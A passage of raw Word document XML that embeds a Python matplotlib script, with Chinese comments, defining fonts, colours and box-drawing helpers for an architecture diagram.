        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import matplotlib.pyplot as plt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23E8BCBA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from matplotlib.patches import FancyArrowPatch, FancyBboxPatch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028B8E68">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38CAB7B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>plt.rcParams["font.sans-serif"] = ["Noto Sans CJK SC", "Noto Sans CJK JP", "DejaVu Sans"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="225EDAD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>plt.rcParams["axes.unicode_minus"] = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5762D850">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="723FFC80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>OUT = Path(__file__).resolve().parent / "figures"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A29A444">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>OUT.mkdir(parents=True, exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05761B19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="062C50E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FIG_W, FIG_H = 8.4, 5.25          # 英寸，比例固定 1.6，对应数据坐标 160 × 100</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DDFC4AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FS_BODY = 8.6                     # 框内正文</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D742608">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FS_HEAD = 10.0                    # 框内标题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A20F9D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FS_GROUP = 10.0                   # 分组标题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A51519">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FS_NOTE = 8.6                     # 箭头标注</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F8912F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>PT_PER_UNIT = FIG_W * 72 / 160.0  # 每个数据坐标单位对应的点数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72356009">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16848B97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>INK = "#1d2b3a"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A917C06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>GREY = "#4f5f70"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64338F49">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1446137B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>C = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D39E5EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "edge": ("#2f6f9f", "#e8f1f8"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50BDF513">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "center": ("#2f7d5c", "#e7f2ec"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F51B5BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "llm": ("#7a4d92", "#f1eaf6"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28EFD14F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "view": ("#b87333", "#fbf0e3"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1943E2A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "plain": ("#4a5a6a", "#f3f5f7"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="014D8025">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "net": ("#5b6b7c", "#eef0f2"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB6AD0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BD71AF9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="382749B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C326D98">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ---------------------------------------------------------------- 绘图原语</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5629B76A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def canvas(w=160, h=100):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6982116A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fig = plt.figure(figsize=(FIG_W, FIG_H), dpi=300)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C6F6680">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax = fig.add_axes([0, 0, 1, 1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C097497">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.set_xlim(0, w)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF971E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.set_ylim(0, h)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8D73D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.set_aspect("auto")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D84524F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.axis("off")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="381C86F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return fig, ax</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0E857B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="189C5655">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5463B52D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def group(ax, x, y, w, h, title, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C92380">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ec, fc = C[key]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0CDEF6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.add_patch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B181DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        FancyBboxPatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4957D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            (x, y), w, h,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A669EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            boxstyle="round,pad=0,rounding_size=1.0",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D3A8222">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            linewidth=1.1, edgecolor=ec, facecolor=fc,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4959F96C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            linestyle=(0, (6, 3)), zorder=1,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFAC11D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF586AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464D89FD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.text(x + 1.5, y + h - 2.4, title, ha="left", va="center",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D43C93">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            fontsize=FS_GROUP, color=ec, weight="bold", zorder=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F7A54DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45493C18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="271DE1B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def box(ax, x, y, w, h, head, body="", key="plain", fs=FS_BODY, hs=FS_HEAD,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A04B3C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        dashed=False, lw=1.4, head_top=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F401C80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ec, fc = C[key]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CED0770">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ax.add_patch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409F7AAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        FancyBboxPatch(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACDAC40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            (x, y), w, h,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A806AF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            boxstyle="round,pad=0,rounding_size=1.0",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="767E626E">
      <w:pPr>
        <w:widowControl w:val="0"/>
